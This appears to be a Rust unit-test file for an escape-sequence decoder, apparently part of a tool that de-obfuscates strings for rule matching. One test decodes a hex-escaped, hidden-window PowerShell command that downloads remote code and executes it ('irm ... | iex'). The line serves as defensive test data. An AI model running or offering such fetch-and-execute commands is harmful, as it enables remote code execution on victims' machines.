use super::{decode, decode_lua};

#[test]
fn elixir_heredoc_requires_complete_delimiters_and_margin() {
    for raw in [
        "\"\"\"\ntext",
        "\"\"\"text\"\"\"",
        "\"\"\"\ntext\"\"\"",
        "\"\"\"\ntext\n'''",
        "\"plain\"",
    ] {
        assert_eq!(super::decode_elixir_heredoc(raw), None, "{raw:?}");
    }
}

#[test]
fn hex_escapes_are_decoded() {
    // js-obfuscator's default string table: every space becomes \x20.
    assert_eq!(
        decode(
            "powershell\\x20-WindowStyle\\x20Hidden\\x20-Command\\x20\\x22irm\\x20https://x/a\\x20|\\x20iex\\x22"
        ),
        "powershell -WindowStyle Hidden -Command \"irm https://x/a | iex\"",
    );
}

#[test]
fn unicode_escapes_and_surrogate_pairs() {
    assert_eq!(decode("\\u0041\\u0042"), "AB");
    assert_eq!(decode("\\u{1F600}"), "\u{1F600}");
    assert_eq!(decode("\\uD83D\\uDE00"), "\u{1F600}");
}

#[test]
fn common_control_and_quote_escapes() {
    assert_eq!(decode("a\\nb\\tc"), "a\nb\tc");
    assert_eq!(decode("say \\\"hi\\\""), "say \"hi\"");
    assert_eq!(decode("C:\\\\Users"), "C:\\Users");
}

#[test]
fn unknown_escapes_pass_through_intact() {
    // A regex inside a string must survive unchanged, or a rule matching on
    // the pattern text would break.
    assert_eq!(decode("\\d{1,3}\\.\\w+"), "\\d{1,3}\\.\\w+");
    // Truncated or malformed escapes keep their backslash rather than
    // silently eating the characters that follow.
    assert_eq!(decode("\\xZZ"), "\\xZZ");
    assert_eq!(decode("\\u12"), "\\u12");
    // A lone high surrogate is not a character and has no pair to join.
    assert_eq!(decode("\\uD83D!"), "\\uD83D!");
}

#[test]
fn strings_without_backslashes_are_untouched() {
    assert_eq!(decode("plain text"), "plain text");
}
#[test]
fn lua_decimal_escapes_are_language_specific() {
    assert_eq!(decode_lua(r"\102\102\105"), "ffi");
    assert_eq!(decode_lua(r"\065\066\067"), "ABC");
    assert_eq!(decode_lua(r"\0\09\1234\255"), "\0\t{4ÿ");
    assert_eq!(decode_lua(r"\\102"), r"\102");
    assert_eq!(decode_lua(r"\999"), r"\999");
    assert_eq!(decode_lua("a\\z \n\tb"), "ab");
    assert_eq!(decode(r"\102"), r"\102");
}
